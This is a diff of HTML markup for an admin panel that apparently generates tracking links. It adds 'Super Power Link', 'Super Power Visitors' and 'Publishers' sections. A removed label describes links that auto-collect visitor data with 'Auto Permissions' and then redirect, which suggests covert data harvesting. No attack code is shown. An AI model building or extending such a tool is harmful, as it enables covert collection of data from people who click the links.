@@ -14,16 +14,21 @@
             <div style="display:flex; gap:10px; flex-wrap:wrap;">
                 <button onclick="showTab('dashboard')" class="tab-btn active" id="tabDashboard">📊 Dashboard</button>
                 <button onclick="showTab('users')" class="tab-btn" id="tabUsers">👥 Users Data</button>
+                <button onclick="showTab('super')" class="tab-btn" id="tabSuper">⚡ Super Power</button>
+                <button onclick="showTab('publishers')" class="tab-btn" id="tabPublishers">📢 Publishers</button>
                 <button onclick="showTab('links')" class="tab-btn" id="tabLinks">🔗 Links</button>
                 <button onclick="logout()" class="logout-btn">Logout</button>
             </div>
         </header>
         
+        <!-- Dashboard Tab -->
         <div id="dashboardTab">
             <div class="dashboard-stats">
                 <div class="stat-card"><h3>👥 Total Visitors</h3><p id="totalVisitors">0</p></div>
                 <div class="stat-card"><h3>🟢 Active Visitors</h3><p id="activeVisitors">0</p></div>
                 <div class="stat-card"><h3>🔗 Total Links</h3><p id="totalLinks">0</p></div>
+                <div class="stat-card"><h3>⚡ Super Power</h3><p id="totalSuper">0</p></div>
+                <div class="stat-card"><h3>📢 Publishers</h3><p id="totalPublishers">0</p></div>
             </div>
             
             <div class="link-generator">
@@ -33,27 +38,34 @@
                     <button onclick="generateCustomLink()">Generate Link</button>
                 </div>
                 <div id="generatedLinkContainer" style="display:none;">
-                    <p><strong>✅ Visitor Links Ready:</strong></p>
+                    <p><strong>✅ Links Generated:</strong></p>
                     
-                    <div style="margin:10px 0; padding:12px; background:#f0f4ff; border-radius:10px; border-left:4px solid #48bb78;">
-                        <p style="font-size:14px; font-weight:600; color:#1a2332;">🔗 Normal Link</p>
-                        <div style="display:flex; gap:10px;">
-                            <input type="text" id="generatedLink" readonly style="flex:1; padding:10px; border:2px solid #48bb78; border-radius:5px; background:#f0fff4; font-size:13px;">
-                            <button onclick="copyToClipboard(document.getElementById('generatedLink').value)" class="camera-btn" style="background:#48bb78;">📋 Copy</button>
+                    <div style="margin:8px 0; padding:10px; background:#f0f4ff; border-radius:8px; border-left:4px solid #48bb78;">
+                        <p style="font-size:13px; font-weight:600; color:#1a2332;">🔗 Normal Link</p>
+                        <div style="display:flex; gap:8px;">
+                            <input type="text" id="generatedLink" readonly style="flex:1; padding:8px; border:2px solid #48bb78; border-radius:5px; background:#f0fff4; font-size:12px;">
+                            <button onclick="copyToClipboard(document.getElementById('generatedLink').value)" class="camera-btn" style="background:#48bb78; padding:5px 12px;">📋</button>
                         </div>
                     </div>
                     
-                    <div style="margin:10px 0; padding:12px; background:linear-gradient(135deg, #fef3c7, #fde68a); border-radius:10px; border-left:4px solid #ed8936;">
-                        <p style="font-size:14px; font-weight:600; color:#92400e;">⚡ Power Link <span style="font-size:12px; font-weight:400;">(Auto Permissions)</span></p>
-                        <div style="display:flex; gap:10px;">
-                            <input type="text" id="powerLinkDisplay" readonly style="flex:1; padding:10px; border:2px solid #ed8936; border-radius:5px; background:#fef3c7; font-size:13px;">
-                            <button onclick="copyToClipboard(document.getElementById('powerLinkDisplay').textContent)" class="camera-btn" style="background:#ed8936;">📋 Copy</button>
+                    <div style="margin:8px 0; padding:10px; background:#fef3c7; border-radius:8px; border-left:4px solid #ed8936;">
+                        <p style="font-size:13px; font-weight:600; color:#92400e;">⚡ Power Link</p>
+                        <div style="display:flex; gap:8px;">
+                            <input type="text" id="powerLinkDisplay" readonly style="flex:1; padding:8px; border:2px solid #ed8936; border-radius:5px; background:#fef3c7; font-size:12px;">
+                            <button onclick="copyToClipboard(document.getElementById('powerLinkDisplay').textContent)" class="camera-btn" style="background:#ed8936; padding:5px 12px;">📋</button>
                         </div>
-                        <p style="font-size:11px; color:#92400e; margin-top:4px;">⚡ Visitor clicks → Auto collect data → Redirect</p>
                     </div>
                     
-                    <p style="margin-top:5px; color:#4a5568; font-size:13px;">📌 Link ID: <span id="generatedLinkId" style="color:#667eea; font-weight:bold;"></span></p>
-                    <p style="color:#4a5568; font-size:13px;">📌 Redirecting to: <span id="redirectUrlDisplay" style="color:#667eea; word-break:break-all;"></span></p>
+                    <div style="margin:8px 0; padding:10px; background:linear-gradient(135deg, #fef3c7, #fde68a); border-radius:8px; border-left:4px solid #f6ad55;">
+                        <p style="font-size:13px; font-weight:600; color:#92400e;">⭐ Super Power Link</p>
+                        <div style="display:flex; gap:8px;">
+                            <input type="text" id="superPowerLinkDisplay" readonly style="flex:1; padding:8px; border:2px solid #f6ad55; border-radius:5px; background:#fef3c7; font-size:12px;">
+                            <button onclick="copyToClipboard(document.getElementById('superPowerLinkDisplay').textContent)" class="camera-btn" style="background:#f6ad55; padding:5px 12px;">📋</button>
+                        </div>
+                    </div>
+                    
+                    <p style="margin-top:8px; color:#4a5568; font-size:12px;">📌 Link ID: <span id="generatedLinkId" style="color:#667eea; font-weight:bold;"></span></p>
+                    <p style="color:#4a5568; font-size:12px;">📌 Redirect: <span id="redirectUrlDisplay" style="color:#667eea; word-break:break-all;"></span></p>
                 </div>
             </div>
             
@@ -63,6 +75,38 @@
             </div>
         </div>
         
+        <!-- Super Power Tab -->
+        <div id="superTab" style="display:none;">
+            <div class="visitors-table">
+                <h2>⚡ Super Power Visitors</h2>
+                <div id="superUsersList"></div>
+            </div>
+        </div>
+        
+        <!-- Publishers Tab -->
+        <div id="publishersTab" style="display:none;">
+            <div class="link-generator">
+                <h3>📢 Create Publisher Link</h3>
+                <div class="link-input-group">
+                    <input type="email" id="publisherEmail" placeholder="Publisher Email" style="flex:1; padding:12px; border:2px solid #ddd; border-radius:5px;">
+                    <input type="text" id="publisherPassword" placeholder="Password" style="flex:1; padding:12px; border:2px solid #ddd; border-radius:5px;">
+                    <button onclick="createPublisher()" class="camera-btn" style="background:#9f7aea;">Create Publisher</button>
+                </div>
+                <div id="publisherLinkContainer" style="display:none; margin-top:10px; padding:10px; background:#f0f4ff; border-radius:8px;">
+                    <p><strong>✅ Publisher Link:</strong></p>
+                    <div style="display:flex; gap:8px;">
+                        <input type="text" id="publisherLinkDisplay" readonly style="flex:1; padding:8px; border:2px solid #9f7aea; border-radius:5px; background:#f0f4ff; font-size:12px;">
+                        <button onclick="copyToClipboard(document.getElementById('publisherLinkDisplay').value)" class="camera-btn" style="background:#9f7aea; padding:5px 12px;">📋</button>
+                    </div>
+                </div>
+            </div>
+            <div class="visitors-table">
+                <h2>📢 All Publishers</h2>
+                <div id="publishersList"></div>
+            </div>
+        </div>
+        
+        <!-- Links Tab -->
         <div id="linksTab" style="display:none;">
             <div class="visitors-table">
                 <h2>🔗 All Generated Links</h2>
@@ -70,6 +114,7 @@
             </div>
         </div>
         
+        <!-- Users Data Tab -->
         <div id="usersTab" style="display:none;">
             <div class="dashboard-stats" id="usersStats">
                 <div class="stat-card"><h3>👥 Total Users</h3><p id="totalUsers">0</p></div>
@@ -104,6 +149,7 @@
             </div>
         </div>
         
+        <!-- Visitor Details Modal -->
         <div class="visitor-details" id="visitorDetails" style="display:none;">
             <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
                 <h2>📊 Visitor Details</h2>
@@ -112,6 +158,7 @@
             <div id="detailsContent"></div>
         </div>
         
+        <!-- Visit Details Modal -->
         <div class="modal" id="visitModal" style="display:none;">
             <div class="modal-content">
                 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
@@ -119,6 +166,17 @@
                     <button onclick="document.getElementById('visitModal').style.display='none'" class="camera-btn delete">✕ Close</button>
                 </div>
                 <div id="visitDetailsContent"></div>
+            </div>
+        </div>
+        
+        <!-- Publisher Details Modal -->
+        <div class="modal" id="publisherModal" style="display:none;">
+            <div class="modal-content">
+                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+                    <h3>📢 Publisher Details</h3>
+                    <button onclick="document.getElementById('publisherModal').style.display='none'" class="camera-btn delete">✕ Close</button>
+                </div>
+                <div id="publisherDetailsContent"></div>
             </div>
         </div>
     </div>
